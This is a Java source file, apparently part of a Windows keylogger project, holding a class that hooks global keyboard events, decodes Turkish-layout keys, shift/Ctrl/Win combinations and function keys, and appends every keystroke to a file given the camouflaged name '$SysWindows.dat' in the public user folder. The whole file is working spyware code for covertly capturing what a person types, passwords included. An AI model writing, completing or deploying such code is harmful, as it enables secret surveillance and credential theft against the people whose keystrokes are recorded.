package com.company.KeyloggerWindows;


import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;


/**
 * You can change the path of keylogger file => WINDOWS_FILE_PATH
 * For only Windows
 */
public class Keyboard extends GlobalKeyAdapter
{
    public static final String WINDOWS_FILE_PATH = "C:\\Users\\Public\\$SysWindows.dat";
    public static boolean run = true;

    private boolean CAPS_LOCK = false;


    IFileOperation fileOperation;
    private String path;
    public Keyboard(IFileOperation fileOperation, String path)
    {
        this.path = path;
        this.fileOperation = fileOperation;
    }

    private String write(int raw)
    {
        if (raw >= 49 && raw <= 57)
            return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_1[raw - 49]);
        if (raw == 192)
            return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_1[12]);
        if (raw == 48)
            return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_1[9]);
        if (raw == 223)
            return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_1[10]);
        if (raw == 189)
            return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_1[11]);
        return null;

    }


    private String pressedKey(int virtual)
    {
        switch (virtual)
        {
            case GlobalKeyEvent.VK_TAB:
                return " [TAB] ";
            case GlobalKeyEvent.VK_SPACE:
                return " ";
            case GlobalKeyEvent.VK_BACK:
                return " [BACKSPACE] ";
            case TurkishKeyboard.TR_ENTER:
                return "\n";
            case GlobalKeyEvent.VK_ESCAPE:
                return " [ESC] ";
            case GlobalKeyEvent.VK_CAPITAL:
                CAPS_LOCK = !CAPS_LOCK;
                return " [CAPS_LOCK] ";
        }
        return null;
    }



    private String numpadCharacters(int virtual)
    {
        switch (virtual)
        {
            case TurkishKeyboard.TR_SLASH:
                return "/";
            case TurkishKeyboard.TR_STAR:
                return "*";
            case TurkishKeyboard.TR_MINUS:
                return "-";
            case TurkishKeyboard.TR_PLUS_NUMPAD:
                return "+";
            case TurkishKeyboard.TR_ENTER:
                return "[ENTER] ";
            case TurkishKeyboard.TR_COMMA:
                return ",";
            default:
                return Integer.toString((virtual - 96));
        }

    }


    private String letters(int virtual, GlobalKeyEvent event)
    {
        String str = null;
        if (event.isShiftPressed())
        {
            str = TurkishKeyboard.getTurkishLetter(virtual);

            if (str != null)
                return str;
            else return String.valueOf((char)event.getVirtualKeyCode()).toUpperCase();
        }

        // ALT
        else if (event.isMenuPressed())
        {
            if (virtual == TurkishKeyboard.TR_SIGN)
                str = "@";
            if (virtual == TurkishKeyboard.TR_TILDE)
                str = "~";
        }
        else if (event.isExtendedKey())
            str = " [WIN + " + String.valueOf((char)event.getVirtualKeyCode()).toUpperCase() + "] ";
        else if (event.isControlPressed())
            str = " [CTRL + " + String.valueOf((char)event.getVirtualKeyCode()).toUpperCase() + "] ";


        else
            str = !CAPS_LOCK ? String.valueOf(event.getKeyChar()).toLowerCase() : String.valueOf(event.getKeyChar()).toUpperCase();

        return str;
    }

    private String numbers(int virtual, GlobalKeyEvent event)
    {
        String str;
        if (event.isShiftPressed())
            str = write(virtual);
        else if (event.isMenuPressed())
            str = writeAlt(virtual);
        else
        {
            if (virtual == 223)
                str = "*";
            else if (virtual == 189)
                str = "-";
            else if (virtual == 192)
                str = "\"";
            else str = String.valueOf(((char) virtual));

        }

        return str;
    }

    private String FSeries(int virtual, GlobalKeyEvent event)
    {

        return event.isShiftPressed() ? " [SHIFT + " +TurkishKeyboard.getFSeries(virtual) + "]" :  TurkishKeyboard.getFSeries(virtual);

    }
    @Override
    public void keyPressed(GlobalKeyEvent event)
    {
        int virtual = event.getVirtualKeyCode();
        String str;

        // Control the pressed shift, space, backspace and ENTER
       str = pressedKey(virtual);

        // Numpad Characters
        if ((virtual >= GlobalKeyEvent.VK_NUMPAD0 && virtual <= GlobalKeyEvent.VK_NUMPAD9) ||
                virtual == TurkishKeyboard.TR_SLASH || virtual == TurkishKeyboard.TR_STAR ||
                virtual == TurkishKeyboard.TR_MINUS || virtual == TurkishKeyboard.TR_PLUS_NUMPAD ||
                virtual == TurkishKeyboard.TR_ENTER || virtual == TurkishKeyboard.TR_COMMA)
                   str = numpadCharacters(virtual);

        //letters [a-z, A-Z]
        if (virtual == TurkishKeyboard.TR_Ğ || virtual == TurkishKeyboard.TR_Ü ||
                virtual == TurkishKeyboard.TR_Ş || virtual == TurkishKeyboard.TR_İ
                || virtual == TurkishKeyboard.TR_Ö || virtual == TurkishKeyboard.TR_Ç
                || virtual == TurkishKeyboard.TR_SEMICOLON ||
                virtual == TurkishKeyboard.TR_COLON ||(virtual >= 65 && virtual <= 90))
            str = letters(virtual,event);

        // Numbers, below F series
        if ((virtual >= 49 && virtual <= 57) || virtual == 223 || virtual == 189 || virtual == 48 || virtual == 192)
            str = numbers(virtual,event);

        // F series keys
        if (virtual >= GlobalKeyEvent.VK_F1 && virtual <= GlobalKeyEvent.VK_F12)
           str = FSeries(virtual, event);

        if (str != null)
            fileOperation.writeFile(str, path,true);

    }


    private String writeAlt(int raw)
    {
        switch (raw)
        {
            case 49: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[0]);
            case 50: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[1]);
            case 51: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[2]);
            case 52: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[3]);
            case 53: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[4]);
            case 55: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[5]);
            case 56: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[6]);
            case 57: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[7]);
            case 48: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[8]);
            case 223: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[9]);
            case 189: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[10]);
            case 192: return String.valueOf(TurkishKeyboard.SPECIAL_COLLECTION_2[11]);
        }
        return null;
    }






}
